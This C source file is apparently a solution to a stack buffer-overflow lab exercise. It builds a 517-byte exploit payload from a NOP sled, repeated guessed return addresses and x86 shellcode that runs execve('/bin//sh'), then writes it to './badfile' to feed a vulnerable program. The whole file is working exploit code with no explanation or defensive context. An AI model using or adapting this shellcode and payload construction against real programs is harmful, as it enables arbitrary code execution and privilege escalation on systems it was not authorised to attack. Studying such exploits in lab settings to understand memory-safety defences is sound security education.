#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=
"\x31\xc0" /* xorl %eax,%eax */
"\x50" /* pushl %eax */
"\x68""//sh" /* pushl $0x68732f2f */
"\x68""/bin" /* pushl $0x6e69622f */
"\x89\xe3" /* movl %esp,%ebx */
"\x50" /* pushl %eax */
"\x53" /* pushl %ebx */
"\x89\xe1" /* movl %esp,%ecx */
"\x99" /* cdql */
"\xb0\x0b" /* movb $0x0b,%al */
"\xcd\x80" /* int $0x80 */
;

unsigned int get_sp(void)
{
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    char *ptr;
    long *a;
    int returnAddress;
    int offset = 300;
    int codeSize = sizeof(shellcode);
    int bufferSize = sizeof(buffer);

    memset(buffer, 0x90, bufferSize);
    returnAddress = get_sp() + offset;
/*
    printf("Stack Pointer: 0x%x\n", get_sp());
    printf("Return Address: 0x%x\n", returnAddress);
    printf("codeSize:%x\n", codeSize);
    printf("bufferSize:%x\n", bufferSize); 
    int num = bufferSize - (codeSize+1);
    printf("num: %x\n", num);
*/
    ptr = buffer;
    a = (long *) ptr;

    int i;
    for (i = 0; i < 10; i++)
    {
        *(a++) = returnAddress;
    }

    int j;
    for(j = 0; j < codeSize; ++j)
    {
        buffer[j+318/*num*/] = shellcode[j];
    }

    buffer[bufferSize-1] = '\0';
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    /*printf("Size of Bad file: %x\n", sizeof(badfile));*/
    fclose(badfile);
}

